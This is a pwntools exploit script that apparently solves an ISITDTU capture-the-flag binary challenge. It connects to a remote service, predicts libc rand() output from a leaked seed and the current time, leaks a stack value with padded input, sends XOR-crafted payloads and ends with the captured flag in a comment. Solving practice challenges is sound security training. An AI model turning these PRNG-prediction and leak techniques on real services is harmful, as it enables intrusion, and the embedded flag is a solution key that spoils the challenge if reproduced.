from pwn import *
from ctypes import CDLL
from bitstring import Bits
script = """

b*main+88
c
"""
libc = CDLL("libc.so.6")
context.binary='./challenge'

#p = process()
#p = gdb.debug('./challenge',script)
leak_seed2 = libc.time(0)
p = remote('34.126.117.161', 2000)
p.recvline()
leak_seed = int(p.recvline().strip(b'\n').decode())

log.info("Leak seed: %d", leak_seed)
print(p.recv())
p.sendline()
#log.info("Leak seed 2: %d", leak_seed2)
libc.srand(leak_seed)
v2 = libc.rand()
#time.sleep(8)
v3 = libc.time(0)
#v3 += 3
print(hex(v2))
print(hex(v3))
payload1 = 0xDEADC0DE ^ v2 ^ v3
payload1 = -2401053092612145152 | payload1
p.recv()
p.send(str(payload1).encode())
p.sendline(b'1')
p.send(b'A'*31+b'B')
p.recvuntil(b'B')
leak_random = u64(p.recvline().strip(b'\n').ljust(8,b'\x00'))
log.info("Leak random: %s", hex(leak_random))
#time.sleep(0.2)
#msg = p.recv()
#if b"What the hell are you shouting? It's disappointing~" not in msg: break 
#p.close()
temp = libc.time(0)
#temp = temp + 1
print(temp)
libc.srand(leak_seed)
v6 = libc.rand()
payload2 = 0xDEADBEEFDEADC0DE ^ leak_random ^ v6
#temp2 = int(hex(payload2 & 0xffffffff),base=16) ^ v6
#temp3 = int(hex(payload2)[:-8] + '0'*8,base=16) | temp2
bin_payload2 = bin(payload2)
temp4 = Bits(bin=bin_payload2)
final_payload = temp4.int
print(v6)
print(payload2)
log.info("Final payload :%d", final_payload)
print(p.recv())
p.sendline()
#payload2 = 0xDEADC0DE ^ v6 ^ leak_random
#payload2 = -2401053092612145152 | payload2
p.send(str(final_payload).encode())
p.interactive()
    #b'-2401053088317177857'
#b*Elementary_Magic+82
#b*Elementary_Magic+108
#Flag: ISITDTU{3133ae9afd7ac43ecd0fbd0a3c128b5ef5a0674b}